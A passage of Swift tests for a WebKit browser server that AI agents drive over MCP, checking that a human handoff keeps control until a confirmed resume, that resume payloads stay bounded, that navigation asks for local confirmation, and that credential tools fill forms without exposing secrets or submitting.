    _ = try await runtime.loadHTML(
      "<button>Continue</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let sessionID = handle.rawValue.uuidString
    _ = try await legacyToolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])
    try runtime.markHumanStepCompleted()

    let blocked = try await legacyToolCall(
      server, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let error = try object(try object(blocked["result"])["structuredContent"])

    let status = try await legacyToolCall(
      server, id: 3, name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)])
    let statusContent = try object(try object(status["result"])["structuredContent"])
    #expect(statusContent["control_state"] == error["control_state"])
    #expect(statusContent["caller_action"] == error["caller_action"])
    #expect(statusContent["remediation"] == error["remediation"])
    #expect(statusContent["recovery_operation"] == error["recovery_operation"])
    #expect(statusContent["recovery_session_id"] == error["recovery_session_id"])
    #expect(statusContent["control_available"] == error["control_available"])
    // handoff_active read as "there is no handoff to resume" is what sent the reported
    // session home. It now means control is held for a person; the narrow token fact
    // keeps its own field.
    #expect(statusContent["human_control_active"] == .bool(true))
    #expect(statusContent["handoff_active"] == .bool(true))
    #expect(statusContent["handoff_resume_token_active"] == .bool(false))
  }

  @Test("Human handoff keeps control until an accepted resume and returns a fresh observation")
  func humanHandoff() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let before = try await runtime.observe()
    let server = WebKitMCPServer(registry: registry)
    let arguments: [String: JSONValue] = [
      "operation": .string("handoff"), "session_id": .string(handle.rawValue.uuidString),
    ]
    let requested = try await toolCall(
      server, id: 1, name: "browser_session", arguments: arguments)
    let firstResult = try object(requested["result"])
    let firstState = try string(firstResult["requestState"])
    #expect(runtime.interactionControlState() == .humanControlled)

    let declined = try await roundTripToolCall(
      server, id: 2, name: "browser_session", arguments: arguments,
      requestState: firstState, action: "decline", confirm: nil)
    #expect(try object(declined["result"])["isError"] == .bool(true))
    #expect(runtime.interactionControlState() == .humanControlled)

    let requestedAgain = try await toolCall(
      server, id: 3, name: "browser_session", arguments: arguments)
    let secondState = try string(try object(requestedAgain["result"])["requestState"])
    let resumed = try await roundTripToolCall(
      server, id: 4, name: "browser_session", arguments: arguments,
      requestState: secondState, action: "accept", confirm: true)
    let structured = try object(try object(resumed["result"])["structuredContent"])
    let observation = try object(structured["observation"])
    #expect(structured["control_state"] == .string("freshly_reobserved"))
    #expect(try string(observation["observationID"]) != before.observationID)
  }

  @Test("Handoff resume returns a bounded observation the client can actually read")
  func handoffResumeIsBounded() async throws {
    // The human handoff is the only escape hatch when a control cannot be actuated,
    // and it returned an unbounded 500-element observation — ~289 000 characters on a
    // real console page, past the client's limit. An escape hatch that cannot be read
    // is not an escape hatch.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let buttons = (0..<400)
      .map { "<button aria-label='Control \($0) with a deliberately long accessible name'>" }
      .joined()
    _ = try await runtime.loadHTML(
      "<title>Wide form</title>" + buttons,
      baseURL: URL(string: "https://example.test/handoff-bounds"),
      timeout: .seconds(4), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])
    try runtime.markHumanStepCompleted()

    let resumed = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let structured = try object(try object(resumed["result"])["structuredContent"])
    #expect(structured["resumed"] == .bool(true))
    guard case .array(let elements) = try object(structured["observation"])["elements"] else {
      Issue.record("the resumed observation carried no element rows")
      return
    }
    #expect(elements.count <= 150)
    let encoded =
      String(
        data: try JSONEncoder().encode(JSONValue.object(structured)), encoding: .utf8) ?? ""
    #expect(
      encoded.count < 100_000,
      "the resume payload is \(encoded.count) characters, which the client cannot read")
  }

  @Test("Blocking handoff resume applies its compact projection and element bound")
  func blockingHandoffResumeIsBounded() async throws {
    // The token route already applied these options. The original round-trip handoff
    // accepted the same arguments, ignored both, and returned every field for every
    // element — about 247k output tokens on Apple Developer's Capability Requests page.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let buttons = (0..<400)
      .map { "<button aria-label='Control \($0) with a deliberately long accessible name'>" }
      .joined()
    _ = try await runtime.loadHTML(
      "<title>Wide blocking handoff</title>" + buttons,
      baseURL: URL(string: "https://example.test/blocking-handoff-bounds"),
      timeout: .seconds(4), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let arguments: [String: JSONValue] = [
      "operation": .string("handoff"),
      "session_id": .string(handle.rawValue.uuidString),
      "compact": .bool(true),
      "maximum_elements": .int(80),
    ]

    let requested = try await toolCall(
      server, id: 1, name: "browser_session", arguments: arguments)
    let requestState = try string(try object(requested["result"])["requestState"])
    try runtime.markHumanStepCompleted()
    let resumed = try await roundTripToolCall(
      server, id: 2, name: "browser_session", arguments: arguments,
      requestState: requestState, action: "accept", confirm: true)
    let structured = try object(try object(resumed["result"])["structuredContent"])
    #expect(structured["observation_compact"] == .bool(true))
    let observation = try object(structured["observation"])
    #expect((try array(observation["elements"])).count == 80)
    let encoded = try JSONEncoder().encode(JSONValue.object(structured))
    #expect(encoded.count < 100_000)
  }

  @Test("A caller can still ask handoff resume for the full observation")
  func handoffResumeStillOffersTheFullObservation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Small form</title><button aria-label='Continue'>",
      baseURL: URL(string: "https://example.test/handoff-full"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])
    try runtime.markHumanStepCompleted()

    let resumed = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token), "compact": .bool(false),
      ])
    let structured = try object(try object(resumed["result"])["structuredContent"])
    #expect(structured["observation_compact"] == .bool(false))
    let observation = try object(structured["observation"])
    // The full payload carries fields the compact rows drop.
    #expect(observation["elements"] != nil)
    #expect(observation["hydration"] != nil || observation["readyState"] != nil)
  }

  @Test("The host lease names the client that took it, from its own handshake")
  func hostLeaseNamesTheClient() async throws {
    // Reported from the Play campaign: the holder came back as "unknown-client" with a
    // null version, so the only way to learn who was blocking the machine was to leave
    // the MCP and run ps. An agent without a shell cannot do that, and the difference
    // matters: another session working is something to wait for, an orphan is something
    // to recover. The classic initialize carries clientInfo in params, which is what
    // real clients send and what this server was ignoring.
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))

    _ = try await call(
      server, id: 1, method: "initialize",
      params: .object([
        "protocolVersion": .string("2025-11-25"),
        "capabilities": .object([:]),
        "clientInfo": .object([
          "name": .string("claude-code"), "version": .string("2.1.7"),
        ]),
      ]),
      modern: false)

    let opened = try await legacyToolCall(
      server, id: 2, name: "browser_session",
      arguments: ["operation": .string("open"), "profile_id": .string("default")])
    let sessionID = try string(
      try object(try object(opened["result"])["structuredContent"])["session_id"])

    let status = try await legacyToolCall(
      server, id: 3, name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": .string(sessionID)])
    let structured = try object(try object(status["result"])["structuredContent"])
    let holder = try object(structured["holder"])
    #expect(holder["client_name"] == .string("claude-code"))
    #expect(holder["client_version"] == .string("2.1.7"))
  }

  @Test(
    "Confirmed tokenless resume retires the earlier token and permits the next handoff",
    arguments: [false, true])
  func tokenlessResumeRetiresEarlierToken(modern: Bool) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>", baseURL: URL(string: "https://example.test/handoff"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: [false, true]))
    let sessionID = JSONValue.string(handle.rawValue.uuidString)
    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": sessionID])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])
    try runtime.markHumanStepCompleted()
    let arguments: [String: JSONValue] = [
      "operation": .string("handoff"), "session_id": sessionID,
    ]
    for accepted in [false, true] {
      if modern {
        let requested = try await toolCall(
          server, id: 2, name: "browser_session", arguments: arguments)
        let state = try string(try object(requested["result"])["requestState"])
        _ = try await roundTripToolCall(
          server, id: 3, name: "browser_session", arguments: arguments,
          requestState: state, action: accepted ? "accept" : "decline",
          confirm: accepted)
      } else {
        _ = try await legacyToolCall(
          server, id: 2, name: "browser_session", arguments: arguments)
      }
      #expect(registry.handoffResumeCapabilityIsActive(token, for: handle) == !accepted)
    }
    #expect(runtime.interactionControlState() == .freshlyReobserved)
    let next = try await toolCall(
      server, id: 4, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": sessionID])
    let nextState = try object(try object(next["result"])["structuredContent"])
    #expect(nextState["resume_token_state"] == .string("active"))
    #expect(nextState["resume_token"] != .string(token))
    #expect(runtime.interactionControlState() == .humanControlled)
  }

  @Test(
    "Orphaned handoff recovery preserves ownership and requires local confirmation",
    arguments: [false, true])
  func orphanedHandoffRecoveryRequiresConfirmation(modern: Bool) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>", baseURL: URL(string: "https://example.test/handoff"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let previous = WebKitMCPServer(registry: registry, presentHumanWindows: false)
    let sessionID = JSONValue.string(handle.rawValue.uuidString)
    let startArguments: [String: JSONValue] = [
      "operation": .string("handoff_start"), "session_id": sessionID,
    ]
    let started = try await toolCall(
      previous, id: 1, name: "browser_session", arguments: startArguments)
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])
    let presenter = ConfirmationPresenterStub(responses: [false, true])
    let current = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter)
    let blocked = try await toolCall(
      current, id: 2, name: "browser_session", arguments: startArguments)
    #expect(
      try object(try object(blocked["result"])["structuredContent"])["code"]
        == .string("session_in_use"))
    #expect(presenter.requests.isEmpty)

    // Model an older broker that resumed without retiring its token, then disconnected.
    try runtime.markHumanStepCompleted()
    try runtime.requestAgentResume()
    _ = try await runtime.resumeAfterHumanControl()
    await previous.prepareForClientReconnect()
    let refused = try await toolCall(
      current, id: 3, name: "browser_session", arguments: startArguments)
    let refusal = try object(try object(refused["result"])["structuredContent"])
    #expect(refusal["handoff_owner_state"] == .string("inactive"))
    #expect(refusal["wait_only"] == .bool(false))
    #expect(refusal["recovery_operation"] == .string("handoff"))
    let status = try await toolCall(
      current, id: 4, name: "browser_session",
      arguments: ["operation": .string("status"), "session_id": sessionID])
    let state = try object(try object(status["result"])["structuredContent"])
    #expect(state["handoff_owner_state"] == .string("inactive"))
    #expect(state["recovery_operation"] == .string("handoff"))
    let recovery: [String: JSONValue] = [
      "operation": .string("handoff"), "session_id": sessionID,
    ]
    for accepted in [false, true] {
      if modern {
        _ = try await toolCall(current, id: 5, name: "browser_session", arguments: recovery)
      } else {
        _ = try await legacyToolCall(current, id: 5, name: "browser_session", arguments: recovery)
      }
      #expect(registry.handoffResumeCapabilityIsActive(token, for: handle) == !accepted)
      #expect(
        runtime.interactionControlState() == (accepted ? .humanControlled : .freshlyReobserved))
    }
    #expect(presenter.requests.count == 2)
  }

  @Test("Completed human handoff releases client ownership on disconnect without losing its token")
  func completedHumanHandoffDisconnectReleasesOwnership() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>", baseURL: URL(string: "https://example.test/handoff"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let owner = WebKitMCPServer(registry: registry, presentHumanWindows: false)
    let next = WebKitMCPServer(registry: registry, presentHumanWindows: false)
    let sessionID = JSONValue.string(handle.rawValue.uuidString)
    let started = try await toolCall(
      owner, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": sessionID])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])
    try runtime.markHumanStepCompleted()
    let statusArguments: [String: JSONValue] = [
      "operation": .string("status"), "session_id": sessionID,
    ]
    let blocked = try await toolCall(
      next, id: 2, name: "browser_session", arguments: statusArguments)
    let before = try object(try object(blocked["result"])["structuredContent"])
    #expect(before["session_owner_state"] == .string("owned_elsewhere"))
    #expect(before["handoff_owner_state"] == .string("owned_elsewhere"))
    #expect(before["wait_only"] == .bool(true))
    let holder = try object(before["holder"])
    #expect(holder["pid_is_this_broker"] == .bool(true))
    #expect(holder["pid_scope"] == .string("server_process"))
    #expect(before["ownership_basis"] == .string("client_connection_identity"))

    await owner.prepareForClientReconnect()
    #expect(registry.count == 1)
    #expect(runtime.interactionControlState() == .humanStepCompleted)
    #expect(registry.handoffResumeCapabilityIsActive(token, for: handle))
    let available = try await toolCall(
      next, id: 3, name: "browser_session", arguments: statusArguments)
    let after = try object(try object(available["result"])["structuredContent"])
    #expect(after["session_owner_state"] == .string("inactive"))
    #expect(after["handoff_owner_state"] == .string("inactive"))
    #expect(after["wait_only"] == .bool(false))
    #expect(after["handoff_resume_token_active"] == .bool(true))
  }

  @Test(
    "Privacy-failed resume preserves navigation confirmation and filtering",
    arguments: ["async", "legacy", "roundtrip"])
  func privacyFailedResumeRecovery(protocolMode: String) async throws {
    let fixture = try HistoryFixtureServer()
    let registry = try WebKitSessionRegistry(runtimeFactory: { _ in
      WebKitRuntime(
        websiteDataStore: .nonPersistent(), egressProxy: nil,
        managesApplicationActivationPolicy: false)
    })
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let source = URL(string: "http://127.0.0.1:\(fixture.port)/first")!
    _ = try await runtime.loadHTML(
      "<button onclick='document.body.dataset.writes=1'>Save</button><input type='password'>",
      baseURL: source, timeout: .seconds(10), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(
      responses: protocolMode == "legacy" ? [true, false, true] : [false, true])
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": session])
    let old = try object(try object(observed["result"])["structuredContent"])
    let target = try elementID(in: old, named: "Save")
    _ = try await runtime.webView.evaluateJavaScript(
      "document.querySelector('input').value='private-canary-'.repeat(6000)")
    let handoff: [String: JSONValue] = ["operation": .string("handoff"), "session_id": session]
    var token: String?
    var state: String?
    if protocolMode == "legacy" {
      _ = try await legacyToolCall(server, id: 2, name: "browser_session", arguments: handoff)
    } else if protocolMode == "roundtrip" {
      let started = try await toolCall(server, id: 2, name: "browser_session", arguments: handoff)
      state = try string(try object(started["result"])["requestState"])
    } else {
      let started = try await toolCall(
        server, id: 2, name: "browser_session",
        arguments: ["operation": .string("handoff_start"), "session_id": session])
      token = try string(
        try object(try object(started["result"])["structuredContent"])["resume_token"])
    }
    try runtime.markHumanStepCompleted()
    let resumed: [String: JSONValue]
    if protocolMode == "legacy" {
      resumed = try await legacyToolCall(server, id: 3, name: "browser_session", arguments: handoff)
    } else if let state {
      resumed = try await roundTripToolCall(
        server, id: 3, name: "browser_session",
        arguments: handoff, requestState: state, action: "accept", confirm: true)
    } else {
      resumed = try await toolCall(
        server, id: 3, name: "browser_session",
        arguments: [
          "operation": .string("handoff_resume"), "session_id": session,
          "resume_token": .string(try #require(token)), "maximum_elements": .int(5),
        ])
    }
    let result = try object(try object(resumed["result"])["structuredContent"])
    #expect(try object(resumed["result"])["isError"] != .bool(true))
    #expect(result["resumed"] == .bool(true))
    #expect(result["control_state"] == .string("agent_controlled"))
    #expect(result["status"] == .string("resumed_observation_unavailable"))
    #expect(result["observation"] == .null)
    #expect(result["observation_available"] == .bool(false))
    #expect(result["action_replayed"] == .bool(false))
    #expect(result["remote_save_verified"] == .bool(false))
    #expect(try object(result["privacy_budget"])["category"] == .string("characters"))
    #expect(try object(result["privacy_budget"])["limit"] == .int(65536))
    if let token { #expect(!registry.handoffResumeCapabilityIsActive(token, for: handle)) }
    #expect(!registry.hasActiveHandoffResumeCapability(for: handle))
    #expect(
      !String(decoding: try JSONEncoder().encode(resumed), as: UTF8.self).contains("private-canary")
    )
    let filtered = try await toolCall(
      server, id: 4, name: "browser_observe", arguments: ["session_id": session])
    #expect(
      try object(try object(filtered["result"])["structuredContent"])["code"]
        == .string("privacy_scan_limit_exceeded"))
    let stale = try await toolCall(
      server, id: 5, name: "browser_act",
      arguments: [
        "session_id": session, "observation_id": old["observationID"]!,
        "element_id": .string(target),
        "operation": .string("click"), "approval_mode": .string("native"),
        "idempotency_key": .string("privacy-recovery-stale"),
        "postcondition": .object([
          "type": .string("semantic_text_appears"), "value": .string("Saved"),
        ]),
      ])
    if stale["error"] == nil {
      #expect(try object(stale["result"])["isError"] == .bool(true))
    }
    #expect(
      try await runtime.webView.evaluateJavaScript("document.body.dataset.writes || '0'") as? String
        == "0")
    let destination = "https://recovery.fixture.invalid/second"
    let navigation: [String: JSONValue] = [
      "session_id": session, "url": .string(destination), "approval_mode": .string("native"),
      "timeout_ms": .int(100), "quiet_window_ms": .int(20),
    ]
    let countBefore = presenter.requests.count
    let declined = try await toolCall(
      server, id: 6, name: "browser_navigate", arguments: navigation)
    #expect(try object(declined["result"])["isError"] == .bool(true))
    #expect(runtime.webView.url == source)
    #expect(presenter.requests.count == countBefore + 1)
    _ = try await toolCall(server, id: 7, name: "browser_navigate", arguments: navigation)
    #expect(presenter.requests.count == countBefore + 2)
    #expect(presenter.requests.last?.message.contains(destination) == true)
    #expect(runtime.interactionControlState() == .agentControlled)
    #expect(runtime.latestNavigationAuditEvent()?.toOrigin == "https://recovery.fixture.invalid")
    #expect(runtime.latestNavigationAuditEvent()?.actor == .agentNavigation)
    // The public API intentionally refuses loopback destinations. The reserved
    // .invalid destination above tests confirmed dispatch without a third-party
    // request. Use the runtime fixture transport to verify a completed navigation.
    _ = try await runtime.navigate(
      to: URL(string: "http://127.0.0.1:\(fixture.port)/second")!,
      timeout: .seconds(10), quietWindow: .milliseconds(40), constrainToInitialOrigin: true)
    _ = try await runtime.webView.evaluateJavaScript(
      "document.body.insertAdjacentHTML('beforeend', '<input name=password type=password value=private-canary-filter><p>private-canary-filter</p>')"
    )
    let fresh = try await toolCall(
      server, id: 8, name: "browser_observe", arguments: ["session_id": session])
    #expect(try object(fresh["result"])["isError"] != .bool(true))
    #expect(
      !String(decoding: try JSONEncoder().encode(fresh), as: UTF8.self).contains(
        "private-canary-filter"))
    #expect(
      try object(try object(fresh["result"])["structuredContent"])["observationID"]
        != old["observationID"])
  }

  @Test("Non-blocking handoff survives a transport reconnect and consumes its token once")
  func nonBlockingHandoffLifecycle() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>", baseURL: URL(string: "https://example.test/handoff"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [])
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let start = try object(try object(started["result"])["structuredContent"])
    let token = try string(start["resume_token"])
    #expect(start["blocking"] == .bool(false))
    #expect(start["control_state"] == .string("human_controlled"))

    // Aqua creates a fresh server for each socket connection. The capability
    // must remain attached to the shared host-owned registry across that edge.
    await server.prepareForClientReconnect()
    let reconnectedServer = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter)

    let polled = try await toolCall(
      reconnectedServer, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let poll = try object(try object(polled["result"])["structuredContent"])
    #expect(poll["resume_token_state"] == .string("active"))
    #expect(poll["ready_for_resume_request"] == .bool(false))
    #expect(poll["human_step_completed"] == .bool(false))
    #expect(poll["human_navigation_completed"] == .bool(false))
    // A navigation completion is a hint only, even when the page looks finished.
    runtime.webView(runtime.webView, didFinish: nil)
    #expect(runtime.humanControlNavigationCompleted)
    #expect(runtime.interactionControlState() == .humanControlled)

    let declined = try await toolCall(
      reconnectedServer, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let declinedState = try object(try object(declined["result"])["structuredContent"])
    #expect(declinedState["resumed"] == .bool(false))
    #expect(declinedState["resume_token_state"] == .string("active"))

    try runtime.markHumanStepCompleted()
    let completed = try await toolCall(
      reconnectedServer, id: 4, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let completedState = try object(try object(completed["result"])["structuredContent"])
    #expect(completedState["human_step_completed"] == .bool(true))
    #expect(completedState["ready_for_resume_request"] == .bool(true))

    // A client can correct an invalid observation option without losing the
    // human-completed handoff. Only a valid resume request consumes the token.
    for (offset, option) in [
      ["compact": JSONValue.string("invalid")],
      ["maximum_elements": JSONValue.int(0)],
      ["maximum_elements": JSONValue.int(2_001)],
    ].enumerated() {
      var arguments: [String: JSONValue] = [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ]
      arguments.merge(option) { _, new in new }
      let invalid = try await toolCall(
        reconnectedServer, id: Int64(40 + offset), name: "browser_session", arguments: arguments)
      #expect(try object(invalid["error"])["code"] == .int(-32602))
      #expect(registry.handoffResumeCapabilityIsActive(token, for: handle))
      #expect(runtime.interactionControlState() == .humanStepCompleted)
    }

    let resumed = try await toolCall(
      reconnectedServer, id: 5, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let resumedState = try object(try object(resumed["result"])["structuredContent"])
    #expect(resumedState["resumed"] == .bool(true))
    #expect(resumedState["resume_token_state"] == .string("consumed"))
    #expect(resumedState["control_state"] == .string("freshly_reobserved"))
    #expect(resumedState["observation"] != nil)

    let replay = try await toolCall(
      reconnectedServer, id: 6, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    #expect(try object(replay["error"])["code"] == .int(-32602))
    #expect(presenter.requests.isEmpty)
  }

  @Test("Authentication keeps the asynchronous handoff token active until the human leaves")
  func authenticationHandoffDoesNotConsumeResumeToken() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Apple ID</title><form><input autocomplete='username'></form>",
      baseURL: URL(string: "https://idmsa.apple.com/IDMSWebAuth/signin?state=private")!,
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString

    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff_start"), "session_id": .string(sessionID)])
    let token = try string(
      try object(try object(started["result"])["structuredContent"])["resume_token"])

    let blocked = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("handoff_resume"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    let blockedState = try object(try object(blocked["result"])["structuredContent"])
    #expect(blockedState["status"] == .string("authentication_origin_requires_human_handoff"))
    #expect(blockedState["origin"] == .string("https://idmsa.apple.com"))
    #expect(blockedState["resumed"] == .bool(false))
    #expect(blockedState["resume_token_state"] == .string("active"))
    #expect(runtime.interactionControlState() == .humanControlled)
    #expect(presenter.requests.isEmpty)

    let polled = try await toolCall(
      server, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("handoff_status"), "session_id": .string(sessionID),
        "resume_token": .string(token),
      ])
    #expect(
      try object(try object(polled["result"])["structuredContent"])["resume_token_state"]
        == .string("active"))
  }

  @Test("The SiliconPass MCP shim is secretless and never submits")
  func siliconPassShim() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <form>
        <label for='username'>Username</label><input id='username'>
        <label for='password'>Password</label><input id='password' type='password'>
        <button type='submit'>Sign in</button>
      </form>
      <script>
        globalThis.submitCount = 0;
        document.querySelector('form').addEventListener('submit', event => {
          globalThis.submitCount += 1; event.preventDefault();
        });
      </script>
      """,
      baseURL: URL(string: "https://fixture.invalid/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      credentialBroker: InProcessSyntheticBrokerStub()
    )
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let structured = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(structured["observationID"])
    let filled = try await toolCall(
      server,
      id: 2,
      name: "browser_fill_siliconpass",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(observationID),
        "username_element_id": .string("e1"),
        "password_element_id": .string("e2"),
      ]
    )
    let result = try object(filled["result"])
    #expect(try object(result["structuredContent"])["status"] == .string("filled"))

    let wire = String(decoding: try JSONEncoder().encode(JSONValue.object(filled)), as: UTF8.self)
    #expect(!wire.contains(InProcessSyntheticBrokerStub.username))
    #expect(!wire.contains(InProcessSyntheticBrokerStub.password))
    let page = try #require(
      await runtime.webView.evaluateJavaScript(
        "JSON.stringify([username.value,password.value,globalThis.submitCount])") as? String
    )
    #expect(
      page
        == "[\"\(InProcessSyntheticBrokerStub.username)\",\"\(InProcessSyntheticBrokerStub.password)\",0]"
    )
  }

  @Test("The SiliconPass rotation tool is secretless and never commits the form")
  func siliconPassRotationShim() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <form>
        <input id='current' type='password' autocomplete='current-password'>
        <input id='next' type='password' autocomplete='new-password'>
        <input id='confirmation' type='password' autocomplete='new-password'>
        <button type='submit'>Change</button>
      </form>
      <script>
        globalThis.submitCount = 0;
        document.querySelector('form').addEventListener('submit', event => {
          globalThis.submitCount += 1; event.preventDefault();
        });
      </script>
      """,
      baseURL: URL(string: "https://fixture.invalid/settings/password"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let server = WebKitMCPServer(
      registry: registry,
      credentialBroker: InProcessSyntheticBrokerStub()
    )
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_rotate_siliconpass_password",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "current_password_element_id": .string("e1"),
        "new_password_element_id": .string("e2"),
        "confirmation_element_id": .string("e3"),
      ]
    )
    let structured = try object(try object(response["result"])["structuredContent"])
    #expect(structured["status"] == .string("changed"))
    #expect(structured["secret_released_to_mcp"] == .bool(false))
    #expect(structured["submitted"] == .bool(false))
    let wire = String(decoding: try JSONEncoder().encode(response), as: UTF8.self)
    #expect(!wire.contains(InProcessSyntheticBrokerStub.password))
    #expect(!wire.contains(InProcessSyntheticBrokerStub.rotatedPassword))
    let page = try #require(
      await runtime.webView.evaluateJavaScript(
        "JSON.stringify([current.value,next.value,confirmation.value,globalThis.submitCount])"
      ) as? String
    )
    #expect(
      page
        == "[\"\(InProcessSyntheticBrokerStub.password)\",\"\(InProcessSyntheticBrokerStub.rotatedPassword)\",\"\(InProcessSyntheticBrokerStub.rotatedPassword)\",0]"
    )
  }

  @Test("A missing SiliconPass credential requests only a human handoff")
  func siliconPassCredentialNotFound() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <label for='username'>Username</label><input id='username'>
      <label for='password'>Password</label><input id='password' type='password'>
      """,
